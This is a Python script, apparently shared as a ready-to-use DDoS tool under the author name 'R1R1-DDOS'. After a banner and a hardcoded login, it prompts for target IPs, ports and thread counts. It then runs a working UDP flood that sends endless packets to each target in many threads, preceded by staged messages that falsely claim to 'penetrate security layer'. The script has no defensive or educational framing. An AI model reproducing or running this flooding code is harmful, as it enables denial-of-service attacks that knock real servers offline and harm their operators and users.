# -*- coding: utf-8 -*-
import logging
import random
import socket
import threading
import os
import sys
import time
import fade

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
attemps = 0
os.system("clear")
print("")
print("\033[91m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")
print("\033[91m||                                                                   ||\033[0m")
print("\033[91m||       ±± ±± ±±        ±± ±± ±±                     ±±±            ||\033[0m")     
print("\033[91m||       ±±       ±±     ±±       ±±                ±± ±±            ||\033[0m")       
print("\033[91m||       ±±       ±±     ±±       ±±                   ±±            ||\033[0m")
print("\033[91m||       ±±       ±±     ±±       ±±                   ±±            ||\033[0m")
print("\033[95m||       ±± ±± ±±        ±± ±± ±±        ________      ±±            ||\033[0m")
print("\033[95m||       ±±   ±±         ±±   ±±         ±± ±± ±±      ±±            ||\033[0m")
print("\033[95m||       ±±     ±±       ±±     ±±                     ±±            ||\033[0m")
print("\033[95m||       ±±       ±±     ±±       ±±                ±± ±± ±±         ||\033[0m")
print("\033[97m||                                                                   ||\033[0m")     
print("\033[95m||      Author  :  R1R1-DDOS                                         ||\033[0m")
print("\033[96m||      Github  :  https://github.com/RR-DDos                        ||\033[0m")
print("\033[94m||                 Fucking genocide                                  ||\033[0m")
print("\033[33m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")         
while attemps < 100:
    username = input("\033[36mEnter your username: \033[0m")
    password = input("\033[93mEnter your password: \033[0m")

    if username == 'r2' and password == 'r2':
        print("\033[33m----------------------------------💥\033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))

time.sleep(5),
print("\033[96m                  ⟩⟩  DD0S TCP LOADER \033[0m "),
time.sleep(5),
print("\033[92m                  ⟩⟩  search server \033[0m "),
time.sleep(5),
print("\033[1m                  ⟩⟩  starts connection \033[0m "),
time.sleep(5),
print("\033[97m                  ⟩⟩  penetrate security layer \033[0m "),
time.sleep(5),
print("\033[95m                  ⟩⟩  send Packet \033[0m "),
time.sleep(5),
# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Lets define sock and bytes for our attack
def send_packets(ip, port, data, proxy_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        for i in range(proxy_size):
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1

# Type your ip and port number (find IP address using nslookup or any online website)
ips = input("IP Targets (separated by commas): ").split(',')
ports = input("Ports (separated by commas): ").split(',')
proxy_size = int(input("Proxy Size : "))
threads = int(input("Number of threads : "))


time.sleep(3)
for ip in ips:
    for port in ports:
        # Use a bytes literal to create the data
        data = b'Hello, this is a DDOS attack'
        print("Starting the attack on ", ip, " at port ", port, " with a proxy size of ", proxy_size, "...")
        for i in range(threads):
            t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
            t.start()           

# Lets keep the terminal clean
if os.name == "nt": # Windows
    os.system("cls")
else: # Linux or Mac
    os.system("clear")
input("Press Enter to exit...")
